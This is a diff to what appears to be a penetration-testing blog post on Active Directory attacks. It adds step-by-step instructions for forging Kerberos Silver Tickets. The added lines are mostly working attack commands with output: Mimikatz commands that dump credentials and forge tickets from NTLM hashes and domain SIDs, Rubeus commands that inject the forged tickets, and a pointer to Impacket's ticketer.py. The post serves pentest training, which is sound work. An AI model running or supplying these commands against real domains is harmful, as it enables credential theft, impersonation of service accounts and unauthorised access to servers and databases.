@@ -775,9 +775,9 @@ Good old Mimikatz, the true swiss-army knife for dumping credentials, kerberos t
 
 Mimikatz Silver Ticket Guide
 
-```
+```powershell
 /domain: The FDQN
-/sid: The SID (Security Identifier) of the Domain
+/sid: The SID (Security Identifier) of the Domain (whoami /user)
 /user: Target Account/Computer to Impersonate
 /id: RID of the account you will be impersonating
 /ptt: Optional (Will Inject Ticket or you can do with Rubeus)
@@ -786,13 +786,40 @@ Mimikatz Silver Ticket Guide
 
 
 
-**AD Security** has a really nice example:
+**AD Security** has a really nice example on using a Computer Hash:
 
 *The following Mimikatz command creates a Silver Ticket for the CIFS service on the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be successfully created, the AD computer account password hash for adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD domain dump or by running Mimikatz on the local system as shown above (Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit). The NTLM password hash is used with the /rc4 paramteer. The service SPN type also needs to be identified in the /service parameter. Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.*
 
-*mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit*
+```
+mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
+```
 
 
+
+
+
+**Service Account Hash Example**
+
+As I mentioned above let's say we have the `NTLM` hash of a Service Account (MSSQL) we can create a Silver Ticket for said User and then start issue SQL Commands to a Database providing the Database accepts Kerberos authentication (Most likely will)
+
+
+
+```powershell
+mimikatz.exe
+prvilege::debug
+
+kerberos::golden /id:1106 /domain:m0chanAD.local /sid:S-1-5-21-1473643419-774954089-2222323452 /target:sqlserver.m0chanAD.local /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:MSSQLSvc /user:m0chanFake /ptt
+```
+
+
+
+**PTT**
+
+As you can see in the above examples I have applied the `/ptt` flag which will automatically inject the ticket into my current session but we can choose to output it to a file with the `/ticket` flag which will output a `ticket.kirbi` file by default unless directly specified.
+
+
+
+We can then use this `kirbi` ticket for a certain level of persistence and/or inject them with Rubeus which Iw ill display below.
 
 
 
@@ -808,6 +835,73 @@ Mimikatz Silver Ticket Guide
 
 As we have discussed Rubeus loads in this article already under `Kerberoasting` and `AS REP` I will jump straight to the chase. 
 
+
+
+We can use Rubeus to inject Silver Tickets into our session by 2 methods, `.kirbi` file or a Base64 of said `.kirbi` file which I find very useful.
+
+
+
+Inject `.kirbi` from Disk
+
+```powershell
+PS C:\Users\m0chan> .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
+
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+PS C:\Users\m0chan> .\Rubeus.exe klist
 ```
 
+
+
+Inject `.kirbi` from Base64 Blog
+
 ```
+PS C:\Users\m0chan> .\Rubeus.exe ptt /ticket:BASE64BLOBHERE
+
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+PS C:\Users\m0chan> .\Rubeus.exe klist
+```
+
+
+
+
+
+## [](#header-3)From Linux 
+
+
+
+I am going to try my best here to show how you can use Silver Tickets/Inject them etc from Linux but truthfully this is a learning experience for me as I 99% of the time carry this out on Windows bases platforms and/or **Domain-Joined Machines**
+
+
+
+## [](#header-5)ticketer.py
+
+Here we find ourselves again on a Linux machine wanting to do Windows things so where do we look? You have one guess. Yep you're right. **Impacket** has a script called `ticketer.py`
+
+
+
+I truthfully just learnt about this script after doing some Googling so I am not expert on it's internals but after a brief overview it appears as if `ticketer.py` allows you to generate forged `Silver` and `Golden` tickets which will come in handy for the next section about `Golden Tickets` 
+
+
+
